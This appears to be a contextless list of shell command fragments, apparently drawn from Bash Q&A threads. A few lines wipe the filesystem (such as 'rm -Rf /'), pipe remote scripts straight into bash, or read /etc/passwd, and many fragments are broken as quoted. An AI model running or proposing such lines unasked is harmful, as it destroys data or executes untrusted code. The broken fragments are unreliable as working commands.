cat temp.txt | sed 's/ /\\ /g'
mysql -u root
/usr/local/mysql/bin/mysql -u root
export PATH
export PATH
grep something
sed 's/[regex]/"/g' filehere
sleep 30
script.sh apple
find -print0
xargs -0
yourscript "a*e"
while read
bash -i -c "blah &"
cp -r
cp -R
mkdir -p $(dirname $destination_path)
top -bn1 | wc -l
du -sh
  cd *
cd a*
(( ))
(( ... ))
((5 == 5))
i=$(( 2+3 ))
(( "$reply" = "yes" ))
(hi there) "My First Name".lastname (another comment) @ domain.(really)invalid
[ -e $f ]
$(cat $1)
for i in $(command)
for i in $(cat something)
dialog --menu
[some command sequence]
[some command sequence]
bind -x
brew install bash;echo /usr/local/bin/bash|sudo tee -a /etc/shells;chsh -s /usr/local/bin/bash
'c '
#!/usr/bin/env ruby
todo new "Some Task"
ruby todo new "Some task"
bash: todo: command not found
chmod +x todo
chmod +x todo
echo $PATH
alias badprogram='A\ Very\ Bad\ Program  --some-argument'
> ../test.txt
gedit; sleep 2; xte -x display 'key k';
grep -n "$searchTerm" "$a" | cut -d: -f 1
awk -v st="$searchTerm" '$0~st{print NR}' "$a"
curl --data-binary directory/$file --request "POST" "http://www.somesite.com"
curl --data-binary @directory/$file --request "POST" "http://www.somesite.com"
find /base/directory/ -type f -iname '*~' -exec ls -l {}\;
-bash: /usr/local/bin: is a directory
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_profile | grep "/usr/local/bin"
cat ~/.bashrc | grep "/usr/local/bin"
port install git-core
export LC_ALL=en_US.UTF-8
export LC_ALL=en_US.UTF-8
source ~/.bash_profile
source ~/.bash_profile
drop_args ls -al
drop_args spaces\ in\ name
cmit "my example commit!"
source ~/.bashrc
cat cmit >> ~/.bashrc
rwx rx rx
chmod 755 my_script
curl -H 'Content-Type: application/json' -X POST http://localhost:3000/users.json\ -d "{"user" : {"email":"sample@example.com", "password":"qwerty", "password_confirmation":"qwerty"}}"
Multi_json decode
curl -H 'Content-Type: application/json' -X POST http://localhost:3000/users.json -d "{\"user\" : {\"email\":\"sample@example.com\", \"password\":\"qwerty\", \"password_confirmation\":\"qwerty\"}}"
wc -l
whence -c
whence -p
echo >
a d/
b c
a d
ls -d !(b|c)
echo "*"
kill TRAPTEST_PROCESS_ID
kill -s HUP TRAPTEST_PROCESS_ID
kill %<jobspec>
kill <PID>
kill %<jobspec>
kill <script_PID>
grep -i "harry " BookDB.txt | awk -F ':' '{print $0}'
awk -F ':' '{print $0}'
cmd1 | cmd2
Git Bash here
PROMPT_COMMAND='history -a'
history -a
history --help
export HISTTIMEFORMAT='%F %T '
echo $VAR
./test foo1.sql
./test foo1.sql
ls | grep home
./script.py file.txt
GNU sed
exec 3> >( gnuplot )
exec >3 >( gnuplot )
exec >3 >( gnuplot )
>( gnuplot )
/usr/lib/jvm/jre/bin/java -server -Xmx1024m -Xms128m -XX:PermSize=128m ';' export -Dmykey=myvalue
JVM_OPTS="-server -Xmx1024m -Xms128m -XX:PermSize=128m -Dmykey=myval -Dmykey2=myval2"
awk '$1!=$2' file
ls -t $DIR | head -1
stat -f %a -t %s
ssh -nq root@$ip /etc/init.d/ft820.rc start
/etc/init.d/ft820.rc start
wget -c -i file
read/write/execute permissions
dos2unix -k -o filename
View > Line Endings > Unix
Line Ending
Save As
yum install dos2unix
$ php ./my_script
File > Convert Line Delimiters To > Unix (LF, \n, 0Α, ¶)
New text file line delimiter
Other: Unix
Window > Preferences > General > Workspace
ARITHMETIC EVALUATION
set -x
+ echo --vendor 'Bleep\' Bloop
\1, \2, ...
home vs /home
cp -ap /home/MinecraftServers /-sometemp-dir
Process pr = run.exec("tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1;echo;");
Miserable Variable
sh -i -c 'cmd1 | cmd2'
sh -c 'LC_ALL=C tr -cd [:alnum:] < /dev/urandom | fold -w30 | head -n1; echo;'
grep -r
while read
for x in .* *; do …
"x$0" == "x"
"x$0" == "x"
[ ]
[ 2 -gt 1 ]; echo $?
test 2 -gt 1; echo $?
man bash
Ctrl+V Tab
pkg_find xx
$1, $2, ..
head -n1 file1
n=${finger | awk 'END{print NR}'}
source search.sh
./script.sh "
./script "ls -la"
ls -la; date
./script ls -la
./script perl -le 'print 0x12, "foo"'
[Layout] => command_prompt
CC=$(cat <&3 | sed -n 2p)
echo $user
$(echo ...)
$1 $2
find . -type f
print $_
say ...
rename $_,$new
($new = $_) =~
perl -E'for (</tmp/my/directory/*.*>){ .....
diff -r
while read
find -print0
find -print0
xargs -0
xargs -n 1
man getopts
sh foo.sh -abc CCC Blank
a 1
b 1
sh foo.sh -a -b -c CCC Blank
a 2, b 3, c 5
sh foo.sh -ab -c CCC Blank
a 1, b 2, c 4
sh foo.sh -a -bc CCC Blank
a 2, b 2, c 4
which mysql
which mysqldump
find . -name '*.pyc' -delete
find . -name '*.pyc' -exec rm -rf {} '+'
kill -0
sys.stdout = file(filename, "w")
player-control vlc toggle
player control
wc -w
git commit
top -bn1 | grep "Cpu(s)"
ps aux|awk 'NR > 0 { s +=$3 }; END {print "cpu %",s}'
top -bn1 | grep
tput cub1
tput cuf1
tput cuu1
tput cud1
$VAR=30 or 50 or 60
where country=country
ssh -V
ARRAY=( ${ARRAY[@]/"$keyword"/} )
ARRAY=(red rednet rd3.0)
unset ${ARRAY["$keyword"]}
:syntax error: invalid arithmetic operator (error token is ".0")
file aesdescrypt
svn status
svn add --force /myLocalDir/files/*
svn status | awk '/\?/ {print $2}' | xargs svn add
svn status | awk '/\!/ {print $2}' | xargs svn rm
svn help status
allocate(array( … .
allocate ( array_name )
If( allocated(array_name) ) deallocate(array_name) allocate ( array_name )
find . \( -name .git -o -name .hg \) -prune -o \( -type d -print \)
which ruby >>/home/usr/bot/output.txt
-exec basename {} \;
find /home -mindepth 1 -maxdepth 1 -not -empty -type d -exec basename {} \; | sort
exit 127
cp -v
shopt -s extglob
stat -f "Copy %-14SHT %N"
cp -v
uptime | awk '{print $3}' | tr -d ,
grep -Po "\d{1,2}:\d{2}(?=,)"
sed -rn 's/.*([0-9]{1,2}:[0-9]{2}),.*/\1/p
Customer ID
Customer Name
Inventory ID
Inventory Name
grep --color
sed ':a;N;$!ba;3s/\n/ /' data.log
*oin* a *o*e*or* assi*n*ent
perl -wpi -e "s/i=\\\$\{BEGIN\}/i=\\\$\{BEGIN\}-1/"
perl -wpi -e 's/i=\$\{BEGIN\}/i=\$\{BEGIN\}-1/'
join '|', map quotemeta, ...
String myArgument = "";
. ~/.bash_profile
/proc/self/fd/13:12310: bad option: -t
-t/ -k1.20
/usr/local/bin/brew doctor
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/linuxbrew/go/install)"
pico .zshrc
brew doctor
Ctrl + X
source ~/.profile
DISPLAY=:0.0 myguiapp.py
echo $DISPLAY
man xhost
find -print0
rm -i *
bash -n
bash -n
bash -n
-s --basic-auth="bds5,/opt/trac/bds5/.htpasswd,Baza Doskonalenia Systemu"
rm mypipe
ls -l mypipe
not found
GNU Make 3.81
make -s
'grep -e '**.zip' | xargs -d '\n' unzip -o'
./script.sh -p mysql
curl -L example.com/my/script | bash -p mysql
/usr/bin/mysql: /usr/bin/mysql: cannot execute binary file
mv -u SOURCE DEST
cp -u SOURCE DEST
sh aggiornaora.sh
tput cols
unset COLUMNS
tput cols
man resize
awk '....' file > file
print $1 "\t" email
diskutil list -plist
tr -s ' '
0x0d 0x0a
head -n 10 /tmp/asdf | tail -n 1
liquibase generateChangelogs
Arithmetic Expansion
unexpected token '&', conditional binary operator expected
-eq 1
3 & 5
4 & 5
$(( (option & option_1) >0 )) )
-gt 0
-eq 1
print $2; exit
~ variable
chromium--kiosk www.bbc.co.uk
FILENAME="$(date +%Y%m%d%H%M%S)"
FILENAME="$(date +%Y%m%d%H%M%S)"
ssh user@host 'execute command'
. .bash_profile
"ssh -f hostname '. .bash_profile && cd /path/to/app && bundle exec rake resque:work QUEUE=queue'"
du -sk
which java
java –version
echo $JAVA_HOME
export JAVA_HOME=${JAVA_HOME}
$(readlink -f /usr/bin/javac | sed "s:/bin/javac::")
export JAVA_HOME=${JAVA_HOME}
bash -vx ./bin/hadoop
export JAVA_HOME=/usr/lib/jvm/default-java
$arg112 + $argendoffile
perldoc perlre
sprintf("%03d", $1)
perldoc -f sprintf
[[ ... ]]
man bash
bash -c '<some smart bash script>'
bash -c "$SCRIPT"
man bash
sudo env
sudo -u $USER_NAME bash
send "cd $2\r"
sed 's/,*$//'
grep -c host
sed 'N; /\n *>=>/ s// >=>/; P; D'
grep -E "\d*"
grep -E "\d*/"
grep -E "\d*/\d*"
grep -E "\d*/\d*/"
grep -E "\d+"
grep -E
grep -P
grep -Eo "\d*"
grep -Eo "\d*/"
grep -Eo "[[:digit:]]*/[[:digit:]]*/"
grep -E --color "[[:digit:]]*/[[:digit:]]*/"
getopt.getopt(args, options[, long_options])
date +%z
-n 1
dpkg -l > /med
export JAVA_HOME=/usr/local/java/
export new=...
cat mysqldump_file | awk -f a.awk
IFS= read -r line
date +%H
date +"%H" | sed -e 's/^0//g'
awk -F: -v v="$username" '{if ($1==v) print $6}' /etc/passwd
cat /etc/passwd | grep "$username" | cut -d ":" -f6
cat /etc/passwd | grep "$username" | cut -d ":" -f5
ulimit -s
<<EOS .... EOS
date +"%I:%M:%S %p"
date +%r
"%I:%M:%S %p"
ls -1
find( \&wanted, "." )
<original filename>_fixed
run rm -Rf /
run which bash >quiet
run touch "foo bar"
run touch "foo" "bar"
run which bash >quiet
echo "### RUN: '$*'" >/dev/tty
run touch "foo bar"
run touch "foo" "bar"
### RUN: 'touch foo bar'
ls -d /home/alice/Documents
ls -d /home/alice/Documents/*/
echo */
echo */*/
ls -d */
ls -dl */
ls -l | grep "^d"
for i in $(ls -d */); do echo ${i%%/}; done
for i in $(ls -d */); do echo ${i}; done
-L level
man tree
echo ./*/
ls -d */
ls -1
ls -d
test -d
echo */
ls -d */
ls -l
{print $9}
ls -l
set -o functrace
set -T
ps -ho comm $$
export LD_PRELOAD=/usr/lib/mylib1.so /usr/lib/mylib2.so
ssh <remoteuser>@<remoteServer> mysqldump -t -u <remoteDbUser> -p<remoteDbPass> <remoteDbName> <remoteDbTable> -w<whereCondition> | mysql -u <localDbUser> -p<localDbPass> <localDbName>
command1 && command2
for ... find
find ... -print0 | while IFS= read -d $'\0' ...
; done
|| <run_your_if_notfound_command_here>
[[ "${array[@]" == *"${item}"* ]]
7+8+1+1+1+1+3+1+2..so on...
man termios
ping -c 3 google.com | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }'
ping -c 3 google.com | grep 'received' | awk -F',' '{ print $2 }' | awk '{ if ($1 == 0) { > host_is_down.txt } else { > host_is_up.txt } }'
brew rm svn serf neon
brew install svn
echo ${sounds[@]}
echo ${sounds[*]}
echo ${!sounds[@]}
declare -A
bash: no match: *foo*
cp *foo* /newdir
echo ${.sh.version}
(( i++ ))
max-bytes 200MB, max-args 2048
bash 4.4
man ksh
/bin/sh /home/user/script.sh
nice 10 php -q ./run_interactive_job.php batch_control_files/updateDB
nice -n 10 php -q ./run_interactive_job.php batch_control_files/updateDB
12-Dec-13 asdasd asdf 11-Jan-12
awk '{for(i=1; i<NF; ++i){if ($i ~ /[0-9]+[-\w]*/) print $i}}' temp.txt
date -d
<a href="http://www.domain.com/">Link Title</a>
11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
[sudo] npm install forever -g
PASS 2
sed "/PASS1/s/'[^']*'/'WXYZ'/2"
exit 1
exit 1
|| exit $?
Brace Expansion
hg log
me@work -> me@home
changeset xxx-border-xxx
hg bundle --base REV
hg bundle --base "ba(home)"
hg bundle --base "ba(work)"
echo -n
[[ $number =~ ^[[:digit:]]+$ ]]
| mysql $params
s3=" SELECT *"
declare -a
export DB_LIST_NAME=locDBList
cut -d ' ' -fx
echo "fo"ob'ar'
set -u
heroku run path/to/file.php
chmod 755
chmod 755
heroku config:add BUILDPACK_URL=https://github.com/heroku/heroku-buildpack-php.git
heroku run ./php/bin/php --version
heroku run bash
bash: sadfasdf: command not found...
man bash
echo "$x\_$y"
echo "${x}_${y}"
wc -l
xauth merge /home/<user>/.Xauthority
java -version
$JAVA_HOME/bin/java -version
awk -F . '{print $NF}'
source ~/.bashrc
(space)> lorem_ipsum
-d =
set -x
while [[ $red -le 255 && $switch -eq 0 ]] || [[ $red -ge 0 && $switch -eq 1 ]]; do
[[: not found
Password store
some pattern
some pattern
$(echo ${temp})
paste ${temp}
echo ${temp}
(NR == 1) { print ; next ; }
Brian Aducci
awk '{if( NR==1 ){print $1" "$2; next}}{a=substr($1,1,1); print a$2" "$3}' temp.txt
#Time value
(stuff) > file.log &
(stuff) | tee file.log &
ssh -X
export DISPLAY=:0
echo $DISPLAY
grep -q "$external_output"
man grep
j doc
brew install autojump
autojump -s
awk '{.....}' ${tempList}> ${tempList}.new
ngram 2 < file
ac bc ad bd
yes | hdiutil ...
echo y | hdiutil
yes | hdiutil
ls -lrt /opt/config/ | grep -i ss7
ps -ef | grep ss7
man grep
GREP="$(which grep)"
shufl file1.dat > shuffle.dat
info coreutils 'date invocation' | less +/28.7\ Relative\ items\ in\ date\ strings
/media/LilGalactus/music/Robert Johnson - Complete Recordings/Robert Johnson - The Complete Recordings (Disc2of2)[EAC-FLAC](oan)/s.gif
%x[ rm "#{filename}" ]
address "(var_address)"
address $address
address (var_address)
/^iface $iface/,/^$/{ ... }
/^iface $iface/
for ((i=000;i<040;i++));do ...
tar: .: file changed as we read it
if [ -L $file ]; then
if [ $a -lt $b ]; then
" "
if [ -z "$string" ]; then
if [[ "$string1" == *[sS]tring* ]]; then
if [[ -a *.sh ]]; then
if [[ $a == 3 || $b == 4]]; then
" "
[ $A -eq 1 ]
[[ $A -eq 1 ]]
[[ ]]
wc -m
$4=left; $5=total;
customer=$customer -v
{$4=left; $5=total;}
Marty McFly
$ sh Text_File.msh
echo "$value"
brew install gettext
echo $PATH
su -
shopt -s expand_aliases
source .cshalias
rm -i
rm -i
man alias
man bash
system("rm ...")
export APPL="DATABASE
/bin/rm ...
command rm ...
source .bashrc
if: Expression Syntax.
Card Detail
Card Detail
Card Detail
perldoc perlre
yes ".."
read -a
set timeout 60
set timeout 20
exp_internal 1
help read
if [ "$username" == "$ALLOWED_USER" ] && [ "$password" == "$ALLOWED_PASS" ]
do shell script
> /dev/null 2>&1 &
grep -q
pdftotext -f $p -l $p
grep --color=always
F, --fixed-strings
x, --line-regexp
$ join file1.txt file2.txt -v 1
$ man join
crontab -l
java --jar sample.jar
sh foo.sh bar
make install
foo bar
make install
echo -e
GNU awk
USE_DOTNET="a b c"
{ print $0 }
Minecraft Server LTG Bukkit 1.4.7
./client_prog host port file_to_receive log_file
$ curl -s http://data.iana.org/TLD/tlds-alpha-by-domain.txt | sed '1d; s/^ *//; s/ *$//; /^$/d' | awk '{print length" "$0}' | sort -rn | cut -d' ' -f2- | tr '\n' '|' | tr '[:upper:]' '[:lower:]' | sed 's/\(.*\)./\1/'
grep -o
7 M/s
5 M/s
ps aux
cat file.sql | mysql
set -x
cat myfile
+cat myfile
man bash
set -v
man bash
set -v
set -o verbose
set -v
command < $somefile
"export FOO=bar"
source .bashrc
-a -G
alias adduser=adduser2group
adduser <user> <group>
if true
echo "2^2" | bc
powershell [math]::sqrt(2+2)
powershell (your_value_here).gettype().name
echo $TERM
echo $TERM
man bash
/bin/bash -c 'echo $TERM'
export TERM=linux
TERM=linux /bin/bash -c 'echo $TERM'
/usr/bin/env TERM=linux /bin/bash -c 'echo $TERM'
"$1" "$2" "$3" ...
startx -- :1
DISPLAY=:1 process1
git archive
git bundle
[[ $foo == *bar* ]]
[[ $foo =~ .*bar.* ]]
[[ ! $filename == *myfile* ]]
curl: (7) couldn't connect to host
curl --data-urlencode
record=grep -c "${Title}:${Author}" BookDB.txt
record=$(grep -c "${Title}:${Author}" BookDB.txt)
record=grep -c ...
awk -F,
as using nested quotes and single-quotes becomes a nightmare of
wc -l
[ ! -z "" ]
ssh hostname
ssh hostname
rsh $host2 sudo yum -y install $package
cat hosts_list
send -- "/system identity print\r"
exp_internal 1
ps -a
kill -1 PID
sleep 30
echo "This is a test" | awk -vRojo=${RED} -v NC=${NORMAL} '{print Rojo $1, $2, NC $3, $4}'
export return_value="return string"
$misses, and $hits
echo $output
s/(.*)\n(.*)/\2 \1/
/^[^ ]*$/
awk '{if ($1 ~ /mysite.com/){a= $0 } if ($1 ~ /dev/){ print a" "$0}}' temp.txt
a = $0
sed -re '/mysite.com/{h;d};G;s/(.*)\n(.*)/\2 \1/' temp.txt
man (1) bash
help test
echo foo
sed -re 's/\\(\w+)(\|)([ A-Za-z]+)\\/\1 \3/g' temp.txt
10.46|5060|100002366551140|WAPNER  M |100002366551750
echo -e "$transform_output"
{ echo "#ADDED LINE#"; echo -e "$transform_output" } > file
script.sh > /dev/null
log_user 0
log_user 1
awk -F\" '{ for(i=2; i<=NF; i=i+2){ a = a"\""$i"\""",\t";} {print a; a="";}}' temp.txt
sed -re 's/\\(\w+)(\|)( \w* )(\|)([ A-Za-z]+)\\/\1\3\5/g' temp.txt
10.46|5060|100002366551140|WAPNER  john   M |100002366551750
{% %}
sort -n
info sort
host:/Users/user $ some really long command pasted in
-bash: some: command not found
host:/Users/user $ some really command pasFoo
-bash: Foo: command not found
export TERM=vt100
echo $TERM
history -f
./auto.sh baz
*Var0.5Def1Min1, *Var0.5Def1Min2, ... , *Var0.5Def10Min100
*Var0.5Def1Min1 > *Var0.50Def1Min1
*Var0.5Def10Min100 > *Var0.50Def10Min100
[[ ]]
[[ ]]
[[ ]]
[ ]
[[ ]]
[[ ]]
[ ]
{ }
man bash
${ }
emacs `lst`
my text
emacs `lst`
emacs my text
emacs my\ text
emacs "`lst`"
printf %q
bash --version
cat test.txt| cut -d';' -f3
bash : precmd command not found
. /var/scripts/siDiagConfig.sh
somethingawesome | grep ${MTU} -c
awk 'END{system(...)}'
eval $(...)
wc -l < filename
expression matching
pattern matching
|| exit 1
command || exit 1
exit 1
command && exit 1 || exit 0
USER $sillyvariable
chmod u+x scrubLog
./scrubLog proftpd.log.2
which psql
export PATH=/usr/local/bin:$PATH
source ~/.bash_profile
which psql
-d postgresql
rake db:create:all
cd ~
nano ~/.bash_profile
export PATH
read -n1 -p "Is this a Personal Project? [y/n] " ORG_SWITCH
[[ ]]
[ ]
GNU bash, version 4.2.24
ssh user1@server -t "cd /home/user2; bash --login"
ssh user1@server -t "cd /home/user2; bash --login -c 'source /home/user2/.bashrc'"
ssh user1@server -t "cd /home/user2; bash --login -c source /home/user2/.bashrc"
ssh user1@server -t "cd /home/user2; bash --login source /home/user2/.bashrc"
ssh user1@server -t "cd /home/user2; bash --login; source /home/user2/.bashrc"
$output = shell_exec
shell_exec("gnome-terminal -e 'bash -c \"expect ~/commands/login_script.tcl; exec bash\"' &");
bind-key -n C-\ send-prefix
(( ))
>= 2
~ $ @
complete -o bashdefault -o default
grep -o
\tgcc -o a filename.c Coomand not found
. FILE && func1
wget -r --user="user" --password="password" -q 'http://server'
seq 20
source MyProcessing.sh
bash MyProcessing.sh
source MyProcessing.sh
RS="\n{2,}|\n([ \t]*\n)+|\n$"
GNU awk
msgstr ""
msgstr ""
msgstr ""
msgstr ""
export AS='name'
source ~/.bash_profile
set ve=all
:%s/\. \+/\./g
runit() { $1; }
runit "ls -l"
ls -l
alias ll="ls -l"
runit "ll"
-bash: ll: command not found
runit() { ll; }
ls -l
mycommand &
let num++
kill -0 pid
CONDITIONAL EXPRESSIONS
man bash
for i in 1 2 3
rvm use ...
source $HOME/.rvm/scripts/rvm
git clone foo:repo path/to/files
... grep -v | while read soname
man -Len -Pless\ -i\ +/^\\\ *process\\\ substitution$ bash
./Test "$i"
./Test 0, ./Test 1
./Test $i
./Test $i
column -t
echo $GIT_DIR
echo "$y"
echo "$x"
help test
python ~doug/scripts/nv.py $1
> /dev/null 2>/dev/null &
a11b12c22d322 e...
#!/bin/bash -e
set -e
{ ... }
$ help exec
pstree 2587 -p
echo $$
echo ${arr[1]}
totalmem ="ps ... |awk '{sum+=$1} END {print sum/1024}'"
totalmem ='ps ... |awk "{sum+=$1} END {print sum/1024}"'
totalmem ='ps ... |awk \'{sum+=$1} END {print sum/1024}\''
totalmem ='ps ... |awk \"{sum+=$1} END {print sum/1024}\"'
"I'm double-quoted"'and I am $HOME-less'-and-i-am-not-quoted
: ;
function myfunction { ... }
myfunction () { ... }
4 * 0 0 * * 0 0
4 * 0 0 * * 0 0
grep -v
grep -v '4 * 0 0 * * 0 0'
unison $OPTIONS a b
test -o
test -o
set +x
printf "%05.3f\n" 23.00
ln -s curr-version-libs
-maxdepth 1
find /
SUM=$(pv "$1" | md5sum)
"$X $Y"
find / -name foo
find / -name
cmd &> myfile
cmd > myfile 2>&1
script -q /dev/null yourcommand
script -c "your command" /dev/null
whenever sqlerror exit sql.sqlcode
whenever sqlerror  (exit -1
cat | while read line;do echo $line | sed
tr '\n' '|'
sed 's/\(.*\)|/\1/'
\( \)
$ e=mc^2 $
\( e=mc^2 \)
sed -re 's/(.*)\$(.*)\$(.*)/\\(\2\\)/g' temp.txt
tr '\n' ' '
sed -re 's/(A=[0-9]+)(.*)(C=[0-9]+)(.*)/\1 \3/' temp.txt
A=1 C=3
ls -tr
ls -dtr
xargs rm -rf
date=$(cat extract.txt | cut -d ' ' -f -3)
email=$(cat extract.txt | sed 's/.*\( to[^ ]*\).*/\1/g' | cut -d '<' -f2 | cut -d '>' -f1)
number=$(cat extract.txt | sed 's/.*Published Number \([^)]*\).*/\1/g')
email=$(cat extract.txt | sed 's/.* to=<\([^>]*\).*/\1/g')
BEGIN{last = ""; value = 0;}
find: -lt: unknown primary or operator
find . -ls
ls -lT
find . -type f | xargs -n1 ls -lT
find . -type f -exec ls -lT {} ';'
for i in $(find . -type f); do ls -lT $i; done
find . -type f | xargs ls -lT
man stat
read name hash
read line
if [[ $DISPLAY ]] && ! tty; then
ln -s
"${1}" = "-gui"
someprog > /dev/null
grep -ow '[0-9]*' yourfile
sed -re 's/(.*)\s([0-9]+)/\2/' temp.txt
curl ifconfig.me
wget -qO- ifconfig.me/ip
route -n
dig +short myip.opendns.com @resolver1.opendns.com
dig +short txt ch whoami.cloudflare @1.0.0.1
dig +short txt o-o.myaddr.l.google.com @ns1.google.com
dig +short txt o-o.myaddr.l.google.com @ns1.google.com | awk -F'"' '{print $2}'
-type f
-type f
-type f
find --version
complete -F <function_name> <program_name>
register-python-argcomplete your_script
$ goto1
./script /tmp txt hello
Give 2 args!
comma (,)
HD > Users > YourUserName
tar -zxf file1
bash yourscript
source yourscript
cd /tmp
touch mickymouse
touch mickymouse
cd /tmp
touch mickymouse
const DEFAULT_[A-Z_]_ERROR_CODE = [0-9]+;
DEFAULT_[...]_ERROR_CODE = "number";
script.sh <  FileNotFoundException.php
$(rm -ri /)
sleep 3
sleep 2
(command1 &) && (command2 &) && (command3 &)
(sleep2 ; fg )& sleep3 ; fg
echo $PATH
(( myarray[i]++ ))
@echo off
exec cygstart cmd
git log -Sstring
git log -S...
git filter-branch -f --tree-filter '/path/to/script.sh $commit 01dPassw0rd\! HIDDENPASSWORD' -- --all
git gc
tr -d '\n'
{ entire-echo-grep-sed-pipeline ; echo , 2013 ; } | xargs echo
BUILD SUCCESSFUL
find $SRCPATH/* 2>/dev/null | wc -l
find /* 2>/dev/null | wc -l
bash -x <your script>
./yourscript grep text {}
echo $PATH
echo "${PATH//:/\n}"
log-bin.000055, 120614936
GNU Grep
source executable
. executable
$(shell [ -t 1 ] ..)
$(shell ...)
$(info ...)
$(shell ...)
GNU parallel
"${MY_ARR[0]%%' '*}"
"${MY_ARR[0]#*' '}"
Parameter Expansion
2>&1 &
fg %{job #}
list of characters that could be used as separators
 
  \t\n
$'    blah  foo=bar \nbaz  '
 
delimiter strings
export -a var
echo "${c%%$'\n'}"
Hello WorldZorGluBHello youZorGluBI'm happy
./my_mv.sh file1 file2
command mv
./my_mv.sh file1 file2
bash --login
command => 'cmd /c dir'
sed -i.bak expression file
chmod +x script.sh
sed 's|^\./\([^/]*\)/|\1/|; s|/.*/|/|; s|/.*.\.| |p; d'
s|^\./\([^/]*\)/.*/|\1 |
s|/.*.\.| |p
a file.xls
a xls
sort | uniq -ic
sort -b -k2,2 -k1,1rn
tr -d '\r'
less -U
less -U
string map
gvim -f MYARGS&
alias gvim=gvim& -f
nnnn >~/...
nnnn >~/...
> foo.txt
pbpaste | bash
eval "$(pbpaste)"
ALTER TABLE
awk -F/ '{print $NF}'
source *~/.bashrc*
# User specific environment and startup programs
source <file_name>
source ~/.bashrc
vim ~/.bashrc
export PATH=$PATH:/path/to/dir
for dirname in $(ls -d root/features/*|awk -F/ '{print $NF}');do;mkdir root/${dirname};cat root/features/${dirname}/* > root/${dirname}/final.txt;done
/bin/sh -c "for dirname in $(ls -d root/features/*|awk -F/ '{print $NF}');do;mkdir root/${dirname};cat root/features/${dirname}/* > root/${dirname}/final.txt;done"
`ls -d root/features/*|awk -F/ '{print $NF}'
sh -c 'cmd1 | cmd2'
sh -eu -xv -c 'cmd1 | cmd2'
bash -c 'cmd1 | cmd2'
for ... ; do; mkdir ...
'  -->  '\''
> save=$PS1
> function reset { PS1=$save; }
> function omar { PS1="\\$1 "; }
> omar u
omar >
> omar @
11:19 PM >
> omar h
omar-Laptop >
ls | $(variable) |awk '/$variable/{print "here"}'
ls | tr '\n' ' ' | tr -d '/' | sed 's/ *$//g'
(variable=$(some_command); awk "/$variable/"'{print "here"}')
/%% mm_dd_YYYY %%\
/%% ... %%\
gsub(/'/, "", $3)
sed "s/^'//;s/'$//"
long double
chmod +x script.sh
xterm tmux
xterm top
git ... grep ... sed
git ... grep ... sed
man bash
echo "GET / HTTP/1.1\nHost: www.example.com\n\n" | openssl s_client -connect www.example.com:443 -quiet 2> /dev/null
2> /dev/null
openssl s_client
bash -ue
commands.add("ssh localhost /tmp/test.sh");
ps h -eo etime
ps -p $pid -oetime= | tr '-' ':' | awk -F: '{ total=0; m=1; } { for (i=0; i < NF; i++) {total += $(NF-i)*m; m *= i >= 2 ? 24 : 60 }} {print total}'
tail +2
tail -n +2
xargs -L1
egrep -r "main" *
egrep -r "main"
egrep -r "pattern" .
cat file | egrep "pattern"
awk '{a[$1]=a[$1]$2" "} END {for (i in a) {print i,a[i]}}' temp.txt
[ -f "$filename" ]
[ -d "$dirname" ]
system(" ");
wait (&status);
jan06.txt, feb06.txt, ..., dec07.txt
cat *.txt > data.txt
git commit -a -m"\"$@\""
git commit -a -m\""$@"\"
shopt -s globstar
my_script.sh "apple"  "carrot"
my_script.sh "apple"
#!/usr/bin/env python
chmod +x test.2.py
shopt -s globstar
rmdir /targetDirectory/*
{print  prev - $1}
This function[passthru()] should be used in place of exec() or system() when the output from the Unix command is binary data which needs to be passed directly back to the browser.
You  can  also  send  output to stdout for piping with the switch
svn commit -m "woohoo"
svn ci
svn commit
svn commit
svn ci
nvcc simple_kernel.cu
export PATH=${PATH}:/usr/local/cuda-5.0/bin
export LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:/usr/local/cuda-5.0/lib:/usr/local/cuda-5.0/lib64
echo $PATH
echo $LD_LIBRARY_PATH
make install
man ld.so
man ldconfig
[ ]
sleep .1
cut: <file>: Illegal byte sequence
Illegal byte sequence
sed '/WP_CACHE/s|^|//|'
sed '/WPCACHE/s|^|//|'
sed '/^define(.WP_CACHE/s|^|//|'
man test
ffmpeg -i /root/name\ of\ video.mp4 /name\ of\ video.mp3
YEARS=`cat FILE | sed -e 's/^.......//' -e 's/\(....\).*$/\1/' | sort | uniq` ; for Y in $YEARS ; do echo Processing $Y... ; egrep '^.......'$Y FILE > $Y.txt ; done
TRUNCATE TABLE
diff -qr dir dir.original
cut -d' ' -f2
diff -qr
Files dir/file1 and dir.original/file1 differ
Files dir/sub-dir/file2 and dir.original/sub-dir/file2 differ
Files dir/sub-dir/file3 and dir.original/sub-dir/file3 differ
-d' '
xargs dirname
mysql dump
cmd1 && cmd2
set -e
iwconfig: unknown command "s:myPassword"
ssh -t
ssh user@host "start.sh < /dev/null > /dev/null 2>&1"
set -m
set -m
above command
source .bash_profile
for i in $myline
mkdir -p /sample/$(dirname $relname)
$file_save= $num_reg[$i] . ".txt";
$file_save="/path/where/to/save". $num_reg[$i] . ".txt";
sed 's/:../ /2'
SAMPLE 350 AN INTEGER OF TYPE :DECIMAL : CAN BE ASSEMBLED BY
awk '/^(name=|&)/{f=f?0:1}f&&/*/{$0="//" $0}1' file
ifconfig $Interface | grep -o -e "inet addr:[^ ]*" | grep -o -e "[^:]*$"
inet Adresse: 192.168.7.10
strace -f
set +o monitor
shopt -s lastpipe
echo data*.txt
line 61: separate_CO_col_index: command not found
ls --color=auto
while read
-v psql_var="$shell_var"
`echo "$shell_var"`
${list//\\n/ }
expect "Username:"
expect "Password:"
xxxx [debug] xxxxx xxxx xxxx
Some Value
GNU sed
bash -s -- <args>
~ curl https://sdk.cloud.google.com | bash -s -- --disable-prompts
Mon Feb  4 11:05:01 MST 2013-- Check Completed Successfully Mon Feb  4 11:10:01 MST 2013-- Check Completed Successfully Mon Feb  4 11:15:01 MST 2013-- Check Completed Successfully Mon Feb  4 11:20:01 MST 2013-- Check Completed Successfully Mon Feb  4 11:25:01 MST 2013-- Check Completed Successfully
:source $HOME/.exrc
chown <your-username> ~/.exrc
chmod go-w ~/.exrc
kill -SIGINT $child
kill -SIGINT -$child
test.sh --child
test.sh --parent
test.sh --child &
info bash
"$0" --child &
{ setsid "$0" --child; } &
C:\Program Files (x86)\...
grep: <part of the xml>: No such file or directory
GNU awk
mkdir -p
awk '{print $2}'
process name1 name2 ...
for f in *
grep -lZ
find -print0
perl -0
sort -z
xargs -0
